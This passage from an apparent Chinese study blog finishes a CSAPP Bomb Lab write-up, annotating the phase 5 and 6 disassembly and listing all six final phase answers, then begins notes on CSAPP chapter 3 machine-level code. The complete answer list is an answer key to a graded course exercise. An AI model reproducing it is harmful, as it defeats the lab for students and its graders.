也就是说这个循环要进行六次。</p><p>我们去掉每次的循环次数判断来分析一下每一行指令都做了什么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movzx  ecx,BYTE PTR [rbx+rax*1]    ;rbx=输入的字符串 rax=0，每次循环都会加1<br>mov    BYTE PTR [rsp],cl    <br>mov    rdx,QWORD PTR [rsp]    ;到此句指令每次循环中读取用户输入字符串的一个字符到寄存器中<br>and    edx,0xf    ;取当前字符的二进制低四位数字<br>movzx  edx,BYTE PTR [rdx+0x4024b0]     ;从0x4024b0读取第rdx的字符，rdx=edx<br>mov    BYTE PTR [rsp+rax*1+0x10],dl    ;保存截取的字符<br></code></pre></td></tr></table></figure><p><code>0x4024b0</code> 处存储着一段字符串 “<strong>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</strong>“，四位的二进制最大是16，也就是说用来做判断的字符串有效值就是 maduiersnfotvbyl ，<del>后面是作者在内涵我们</del></p><p>至此我们得出了字符串处理的方法，每次循环从输入的字符串按顺序取一个字符，检查所取字符的低四位数字，以这个数字为偏移在给定字符串中查找，要求最后的结果是 flyers。</p><p>我写了一个函数来找可见字符串的组合：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> <br>&#123;<br>    <span class="hljs-type">int</span> targetValue[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">9</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;; <br>    <span class="hljs-type">char</span> visibleChars[] = <span class="hljs-string">&quot; !#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">6</span>;j++) <br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n找到尾数为%d的字符：&quot;</span>,targetValue[j]);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; visibleChars[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++)<br>&#123;<br><span class="hljs-type">char</span> currentChar = visibleChars[i];<br>            <span class="hljs-type">int</span> charValue = currentChar - <span class="hljs-string">&#x27;0&#x27;</span>; <span class="hljs-comment">// 将字符转换为对应的整数值</span><br>        <span class="hljs-keyword">if</span> ((charValue &amp; <span class="hljs-number">0xF</span>) == targetValue[j]) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, currentChar);<br>&#125;<br>        &#125;<br>    &#125;<br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-5_result.png"></p><p>每一个拎出来一个组合一下就行，我选的 ionefg  <del>主要是全是小写字母不用大小写转换</del></p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><blockquote><p>本来说是这道题可以不做，但是我又不想这个国庆假期里去看新东西了（我是懒惰虫，就做了一下子，然后这一道题做了一天😿</p></blockquote><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-6_six_number.png"></p><p>已经摸清套路了，这个环节要求输入六个数字。</p><p>汇编代码很长，大致看了一下在整个函数里面跳来跳去的，看着就头昏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004010f4 &lt;+0&gt;:push   r14<br>0x00000000004010f6 &lt;+2&gt;:push   r13<br>0x00000000004010f8 &lt;+4&gt;:push   r12<br>0x00000000004010fa &lt;+6&gt;:push   rbp<br>0x00000000004010fb &lt;+7&gt;:push   rbx<br>0x00000000004010fc &lt;+8&gt;:sub    rsp,0x50<br>0x0000000000401100 &lt;+12&gt;:mov    r13,rsp<br>0x0000000000401103 &lt;+15&gt;:mov    rsi,rsp<br>0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;    ;读六个数字<br>0x000000000040110b &lt;+23&gt;:mov    r14,rspn<br>0x000000000040110e &lt;+26&gt;:mov    r12d,0x0<br>0x0000000000401114 &lt;+32&gt;:mov    rbp,r13<br>0x0000000000401117 &lt;+35&gt;:mov    eax,DWORD PTR [r13+0x0]    ;取一个数字<br>0x000000000040111b &lt;+39&gt;:sub    eax,0x1    ;将取出的数字-1<br>0x000000000040111e &lt;+42&gt;:cmp    eax,0x5     ;结果要小于等于5<br>0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;   <br>0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401128 &lt;+52&gt;:add    r12d,0x1<br>0x000000000040112c &lt;+56&gt;:cmp    r12d,0x6    ;六次循环<br>0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;    <br>0x0000000000401132 &lt;+62&gt;:mov    ebx,r12d    <br>0x0000000000401135 &lt;+65&gt;:movsxd rax,ebx<br>0x0000000000401138 &lt;+68&gt;:mov    eax,DWORD PTR [rsp+rax*4]<br>0x000000000040113b &lt;+71&gt;:cmp    DWORD PTR [rbp+0x0],eax      ;判断数字是否两两相等<br>0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;<br>0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401145 &lt;+81&gt;:add    ebx,0x1<br>0x0000000000401148 &lt;+84&gt;:cmp    ebx,0x5<br>0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;<br>0x000000000040114d &lt;+89&gt;:add    r13,0x4<br>0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;  <br>0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]    <br>0x0000000000401158 &lt;+100&gt;:mov    rax,r14<br>0x000000000040115b &lt;+103&gt;:mov    ecx,0x7<br>0x0000000000401160 &lt;+108&gt;:mov    edx,ecx    ;edx=7<br>0x0000000000401162 &lt;+110&gt;:sub    edx,DWORD PTR [rax]    ;当前数字-7，结果覆盖原数字<br>0x0000000000401164 &lt;+112&gt;:mov    DWORD PTR [rax],edx<br>0x0000000000401166 &lt;+114&gt;:add    rax,0x4    ;准备读取下一个数字    <br>0x000000000040116a &lt;+118&gt;:cmp    rax,rsi    ;判断是不是最后一次循环<br>0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;    ;跳转回操作数字处理继续进行下一个数字的处理<br>0x000000000040116f &lt;+123&gt;:mov    esi,0x0<br>0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;<br>0x0000000000401176 &lt;+130&gt;:mov    rdx,QWORD PTR [rdx+0x8] <br>0x000000000040117a &lt;+134&gt;:add    eax,0x1<br>0x000000000040117d &lt;+137&gt;:cmp    eax,ecx<br>0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;<br>0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;<br>0x0000000000401183 &lt;+143&gt;:mov    edx,0x6032d0<br>0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx<br>0x000000000040118d &lt;+153&gt;:add    rsi,0x4    <br>0x0000000000401191 &lt;+157&gt;:cmp    rsi,0x18    <br>0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;<br>0x0000000000401197 &lt;+163&gt;:mov    ecx,DWORD PTR [rsp+rsi*1]   <br>0x000000000040119a &lt;+166&gt;:cmp    ecx,0x1   <br>0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;   <br>0x000000000040119f &lt;+171&gt;:mov    eax,0x1<br>0x00000000004011a4 &lt;+176&gt;:mov    edx,0x6032d0<br>0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;<br>0x00000000004011ab &lt;+183&gt;:mov    rbx,QWORD PTR [rsp+0x20]<br>0x00000000004011b0 &lt;+188&gt;:lea    rax,[rsp+0x28]<br>0x00000000004011b5 &lt;+193&gt;:lea    rsi,[rsp+0x50]<br>0x00000000004011ba &lt;+198&gt;:mov    rcx,rbx<br>0x00000000004011bd &lt;+201&gt;:mov    rdx,QWORD PTR [rax]<br>0x00000000004011c0 &lt;+204&gt;:mov    QWORD PTR [rcx+0x8],rdx<br>0x00000000004011c4 &lt;+208&gt;:add    rax,0x8<br>0x00000000004011c8 &lt;+212&gt;:cmp    rax,rsi<br>0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;<br>0x00000000004011cd &lt;+217&gt;:mov    rcx,rdx<br>0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;<br>0x00000000004011d2 &lt;+222&gt;:mov    QWORD PTR [rdx+0x8],0x0<br>0x00000000004011da &lt;+230&gt;:mov    ebp,0x5<br>0x00000000004011df &lt;+235&gt;:mov    rax,QWORD PTR [rbx+0x8]<br>0x00000000004011e3 &lt;+239&gt;:mov    eax,DWORD PTR [rax]<br>0x00000000004011e5 &lt;+241&gt;:cmp    DWORD PTR [rbx],eax<br>0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;<br>0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004011ee &lt;+250&gt;:mov    rbx,QWORD PTR [rbx+0x8]<br>0x00000000004011f2 &lt;+254&gt;:sub    ebp,0x1<br>0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;<br>0x00000000004011f7 &lt;+259&gt;:add    rsp,0x50    ;准备结束函数<br>0x00000000004011fb &lt;+263&gt;:pop    rbx<br>0x00000000004011fc &lt;+264&gt;:pop    rbp<br>0x00000000004011fd &lt;+265&gt;:pop    r12<br>0x00000000004011ff &lt;+267&gt;:pop    r13<br>0x0000000000401201 &lt;+269&gt;:pop    r14<br>0x0000000000401203 &lt;+271&gt;:ret    <br></code></pre></td></tr></table></figure><p> <del>乱七八糟乱七八糟</del>    </p><p>这个循环大概分为几个部分：</p><ul><li><p><em>+23 - +60</em> 判断输入的六个数字是否都小于等于6</p></li><li><p><em>+62 - +93</em> 两个小循环来判断输入的数字是不是重复的   </p></li><li><p><em>+108 -+128</em> 所有数字都与7做差再用结果覆盖原始值</p></li><li><p><em>+130 - +181</em> 重新安排链表</p></li><li><p><em>+183 - +257</em> 检验链表中的数据是否从大到小排序</p></li></ul><p>关于链表的操作部分：</p><p>+130 处的操作是 <code>mov rdx,QWORD PTR [rdx+0x8]</code> ，这是链表的一种表示方法，将链表中的节点串接起来。</p><p>在 +176 处取了一个地址进行操作，查看此处内存数据：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-6_information.png"></p><p>根据信息存储的方式也可以判断出这是一个链表，从 1-6 每一个索引值对应节点存储的数据为：332，168，924，691，477，413</p><p>也就是说这部分中，程序会先用7减去我们输入的数据，然后以我们输入的数据的顺序来重新排列链表中数据的顺序。比如我们输入 1、2、3、4、5、6 ，与 7 做差结果是 6、5、4、3、2、1，假设我们用 [n] 来表示原本链表中的第n个数据，那么它的排序顺序就是 [6]、[5]、[4]、[3]、[2]、[1]，并且此时我们需要保证数据是从大到小排序的。</p><p>所以可以逆向分析，我们先把原链表中的数据排序，顺序是 3、4、5、6、1、2。又因为我们需要先与 7 做差，再逆向推回去就是 <strong>4、3、2、1、6、5</strong>。</p><hr><p>我最后总的作答是这样的</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">Border relations with Canada have never been better.<br>1 2 4 8 16 32<br>0 207<br>0 0<br>ionefg<br>4 3 2 1 6 5<br></code></pre></td></tr></table></figure><p>完结撒花~🥳</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-result.png"></p><hr><p>原来这个实验我做了三天😶‍🌫️果然假期就是懒惰</p><p>xsbb:</p><p>在 phase_3 的跳转表那里，其实我当时根本没看出来这是跳转表，我去问了 chatCPT😿</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct_chat.png"></p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPPlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第三章 程序的机器级表示 总结</title>
    <link href="/2023/09/30/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"/>
    <url>/2023/09/30/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<p>C语言指令对应的机器表示</p><span id="more"></span><h3 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h3><p>Inter 处理器系列俗称 x86，它经历了一个长期的、不断进化的过程。几十年来，实现了从 16 位到 32 位 i386，最后到现在 64 位的 x86-64 处理器，其中每个后继处理器都是向后兼容的——较早版本的处理器上编译的代码总是可以在较新的处理器上运行。</p><h5 id="摩尔定律"><a href="#摩尔定律" class="headerlink" title="摩尔定律"></a>摩尔定律</h5><p>1965年，Gordon Mone （Intel 公司的创始人）推断，在未来的十年，芯片上的晶体管数量每年都会翻一番，这个预测就是摩尔定律。事实证明这个预测是正确的。</p><blockquote><p>还以为是摩尔庄园那个摩尔（x</p></blockquote><h3 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h3><p>假设C程序 Hello.c 文件，我们在 linux 系统中用下面的命令编译代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">gcc -g Hello.c -o Hello</span><br></code></pre></td></tr></table></figure><blockquote><p>gcc（GCC）是 Linux 的默认编译器</p></blockquote><p>用户看来是执行了一条命令，但是实际上机器执行了一系列的程序，才将源代码转换成可执行代码。有以下几个流程，我们也可以用不同的命令控制 GCC 逐步执行：</p><ul><li><p>预处理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -E Hello.c -o Hello.i</span><br></code></pre></td></tr></table></figure><p>C预处理器拓展源代码，插入所有 #include 命令指定的文件，并拓展所有以 #define 声明指定的宏。</p></li><li><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -S Hello.i -o Hello.s</span><br></code></pre></td></tr></table></figure><p>编译器会产生汇编代码文件 <code>Hello.s</code>。</p></li><li><p>汇编</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -c test.s -o test.o</span><br></code></pre></td></tr></table></figure><p>汇编器会将汇编代码转化成二进制目标代码文件 <code>Hello.o</code> 。其中，目标代码是汇编代码的一种形式，它包含所有指令的二进制表示，但是没有填入全局值的地址。</p></li><li><p>链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -g test.o -o <span class="hljs-built_in">test</span> [--static]</span><br></code></pre></td></tr></table></figure><p>连接器将目标代码文件与实现库函数（例如 printf ）的代码合并，并产生最终的可执行代码文件。其中，我们可以在队后一步编译的时候添加 <code>static</code> 参数进行静态链接，不参加参数就是默认动态链接。</p></li></ul><p>对于机器级编程来说，有两种抽象尤为重要：</p><ul><li>由指令集体系结构或指令集架构（ISA）定义的机器及程序的格式和行为。</li><li>内存地址实际上是虚拟地址</li></ul><p>在C语言中，我们声明和分配各种数据类型的对象，但是机器代码不区分这些数据，只是将内存看作一个很大的、按字节寻址的数组。不区分各种类型的数据，数组和结构也只使用一组连续的字节来表示。</p><p>X86-64 的机器代码和原始的C语言代码差别很大，对于程序员来说是有很多的隐藏状态，例如：</p><ul><li>程序计数器（通常称为 PC ，在 x86-64 中用 <code>%rip</code> 表示）用于指示程序要执行的下一条指令在内存中的地址</li><li>整数寄存器文件，用于存储地址（对应C语言的指针）或整数数据。</li><li>条件码寄存器，保存着最近执行的算术逻辑或逻辑指令的状态信息</li><li>向量寄存器，存放一个或多个整数或浮点数值</li></ul><blockquote><p>我们经常接触到的汇编语言，其实并不是机器语言。但是汇编代码表示非常接近机器代码，由于汇编代码对于程序员来讲更具有可读性，所以我们经常用汇编代码来学习和解释机器代码行为</p></blockquote><p>程序内存这些都是由虚拟内存来寻址的，操作系统负责管理虚拟内存空间，把<strong>虚拟地址转换为实际物理地址</strong>。</p><p>前面有提到，程序的汇编指令转化为计算机可读的文件二进制目标代码后就变成了一个01的字节序列，机器也只是执行这个字节序列，机器对指令的源代码一无所知。</p><p>当然我们可以利用下面的命令反编译可重定向文件或者是可执行 ELF 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">objdump -d filename.o</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">objdump -d filename</span><br></code></pre></td></tr></table></figure><p>我们也可以使用 <code>hexdump -x  filename.o</code> 命令输出二进制文件的十六进制表示形式（虽然没有什么可读性上的帮助 <del>xsbb</del>）</p><blockquote><p>objdump 、hexdump 命令还有不同参数对应不同功能 </p></blockquote><p>机器代码的特性：</p><ul><li><p>指令可以从任意内存地址开始，CPU不会强制进行代码对齐</p></li><li><p>指令长度从1字节到15字节不等。常用指令的字节数少，越不常用字节数越多</p></li><li><p>从给定的某一位置开始，每一个机器字节都对应唯一的指令</p></li><li><p>反汇编器只是根据字节序列确定汇编代码，它不需要访问编译出该程序的源文件</p></li></ul><p>如果我们直接 <code>cat filename.s</code>，输出的汇编代码如下图所示：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E6%9F%A5%E7%9C%8B%E6%B1%87%E7%BC%96%E6%96%87%E4%BB%B6.png"></p><p>其中以 <code>.</code> 开头的都是知道汇编器和编译器的伪指令，我们可以忽略。我们在表示汇编代码时会省略这些伪指令，同时，汇编代码的格式也有不同，分为 AT&amp;T 和 Inter 两种风格：</p><blockquote><p>gcc 默认输出的是 AT&amp;T ，微软系列都是 Inter</p></blockquote><table><thead><tr><th></th><th>Inter</th><th>AT&amp;T</th></tr></thead><tbody><tr><td>指令后缀</td><td>无后缀，例如：mov、push</td><td>有指示大小的后缀，例如：pushq、movq</td></tr><tr><td>寄存器</td><td>寄存器无 % 符号，例如：rbx</td><td>寄存器有 % 符号，例如：%rbx</td></tr><tr><td>立即数</td><td>有任何前缀，直接用一个数字表示</td><td>用 $ 前缀表示一个立即数</td></tr><tr><td>操作数顺序</td><td>操作符 目的操作数 , 源操作数 例如：mov eax,1</td><td>操作符 源操作数 , 目的操作数  例如：mov $1,%eax</td></tr><tr><td>内存取址</td><td>section:[base + index*scale + disp]</td><td>section:disp(base, index, scale)</td></tr></tbody></table><blockquote><p>其中base和index必须是寄存器，disp和scale可以是常数</p><p>计算方法 :  disp + base + index * scale</p><p>最终地址 &#x3D; 地址或偏移 + %基址或偏移量寄存器 + %索引寄存器 * 比例因子</p></blockquote><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><p>由于 Intel 是从 6 位体系拓展成 64 位的，所以用术语 “字(word)” 表示 16 位的数据类型，因此 32 位数被称为 “双字(double words)”，同理 64 位数被称为 “四字(quad words)”。</p><p>指针在不同位数系统中的大小不同，在多少的系统里面就是多少，64位系统中就对应存储为 8 字节的四字。</p><p>下面是常见的数据类型的大小：</p><table><thead><tr><th align="center">C声明</th><th align="center">Intel数据类型</th><th align="center">汇编代码后缀</th><th align="center">大小（字节）</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">字节</td><td align="center">b</td><td align="center">1</td></tr><tr><td align="center">short</td><td align="center">字</td><td align="center">w</td><td align="center">2</td></tr><tr><td align="center">int</td><td align="center">双字</td><td align="center">l</td><td align="center">4</td></tr><tr><td align="center">long</td><td align="center">四字</td><td align="center">q</td><td align="center">8</td></tr><tr><td align="center">char *</td><td align="center">四字</td><td align="center">q</td><td align="center">8</td></tr><tr><td align="center">float</td><td align="center">单精度</td><td align="center">s</td><td align="center">4</td></tr><tr><td align="center">double</td><td align="center">双精度</td><td align="center">l</td><td align="center">8</td></tr></tbody></table><p>需要注意的是，虽然4字节的整数和双精度浮点数都是用 l 来表示，但是不会产生歧义，因为两种数据类型使用的是完全不同的两组指令和寄存器。</p><h3 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h3><p>寄存器用来存储数据和指针，最初的16位系统中有八个16位的寄存器，分别是 ax , bx , cx , dx , d i, si , sp , bp 。后来发展到 32 位，寄存器也拓展成 32 位，在原本寄存器名字的前面加上 <code>e</code> 来表示，如 eax 。现在的 x86-64 中，寄存器对应拓展为 64 位，把所有的 <code>e</code> 替换成了 <code>r</code>，并且新增了 8 个寄存器 r8~r15。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%AF%84%E5%AD%98%E5%99%A8.png"></p><h4 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h4><p>大多数的指令都有一个或多个操作数，指示出执行一个操作中要使用的源数据值以及放置结果的目的位置。操作数可以是立即数、寄存器或者内存引用。</p><p>其中，内存引用会根据计算出的有效地址去访问内存位置。同时，有许多种寻址模式，允许不同形式的内存引用。书上也给出了很多寻址模式的解析：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F.png"></p><p>我们最常用的寻址方式是图上的最后一个，是<strong>比例变址寻址</strong>的一种，表示为 <code>Imm(x,y,z)</code>，表示了地址为 <code>x+yz+Imm</code> 的内存空间。</p><h4 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h4><p>数据传送指令，就是字面意思，把数据从一个位置复制到另一个位置的指令。</p><p>我们把对应执行操作相同，但是执行的操作数大小不同的不同指令称之为同一个<strong>指令类</strong>。</p><p>MOV 类指令是最简单的数据传送指令，在实际应用中也最为频繁。这类指令把数据从原位置复制到目的位置，不对数据做任何的处理和改变。</p><p>这类指令有两个操作数，源操作数存储在寄存器或内存中的立即数 ，而目的操作数指定一个位置，它是寄存器或者一个内存地址。需要注意的是，<strong>传送指令的两个操作数不能同时指向内存位置</strong>。</p><p>MOV 类由 <code>movb</code>、<code>movw</code>、<code>movl</code>、<code>movq</code> 四个指令组成，它们之间的差异是<strong>操作数据大小不同</strong>，分别对应 1 字节、2 字节、4 字节和 8 字节，操作数中的寄存器部分必须和指令最后一个字符对应。这其中传输双字的指令 <strong>movl ，如果目的操作数是一个寄存器，那么它会把寄存器的高位 4 字节全部置零</strong>。</p><p>有的时候目的寄存器和源寄存器的字长并不是对应的，可能会出现目的寄存器的字长大于源寄存器的情况，这个时候就会对源操作数进行拓展。这样又对应有两种拓展方式：零拓展（MOVZ 类）和符号拓展（MOVS类）。</p><p>指令名称中的后两个字符都是大小指示符，第一个字符指定源的大小（字节b，字w，双字l），第二个就是目的大小（字w，双字l，四字q）。具体如下表：</p><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>movzbw</td><td>将做了零拓展的字节传送到字</td></tr><tr><td>movzbl</td><td>将做了零拓展的字节传送到双字</td></tr><tr><td>movzwl</td><td>将做了零拓展的字传送到双字</td></tr><tr><td>movzbq</td><td>将做了零拓展的字节传送到四字</td></tr><tr><td>movzwq</td><td>将做了零拓展的字传送到四字</td></tr><tr><td>movsbw</td><td>将做了符号拓展的字节传送到字</td></tr><tr><td>movsbl</td><td>将做了符号拓展的字节传送到双字</td></tr><tr><td>movswl</td><td>将做了符号拓展的字传送到双字</td></tr><tr><td>movsbq</td><td>将做了符号拓展的字节传送到四字</td></tr><tr><td>movswq</td><td>将做了符号拓展的字传送到四字</td></tr><tr><td>movslq</td><td>将做了符号拓展的双字传送到四字</td></tr><tr><td>cltq</td><td>把 %eax 符号拓展到 %rax ，等效于 movslq %eax, %rax</td></tr></tbody></table><p>零拓展是用 0 填充目的中的剩余字节，符号拓展就是用最高位符号位填充剩余字节。</p><h4 id="压入和弹出栈数据"><a href="#压入和弹出栈数据" class="headerlink" title="压入和弹出栈数据"></a>压入和弹出栈数据</h4><p>压栈和入栈实际上也是数据传送的操作，只不过操作的对象是栈。<code>pushq(push)</code>的功能是把数据压入栈，<code>popq(pop)</code> 的功能是弹出数据。这两个指令都只有一个操作数——压入的数据源和弹出的数据目的。</p><p>push 的作用是将栈指针减 8 也就是抬高栈顶，再将操作数写入开辟出来的栈空间中；pop 正好相反，先将栈顶的8 字节数据传送到操作数当中，再将栈指针加 8。</p><p>需要注意的是，因为不能同时交换两个内存地址，所以 <strong>push 的源操作数只能是立即数或者是寄存器， pop 的目的操作数只能是寄存器</strong>。</p><h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" 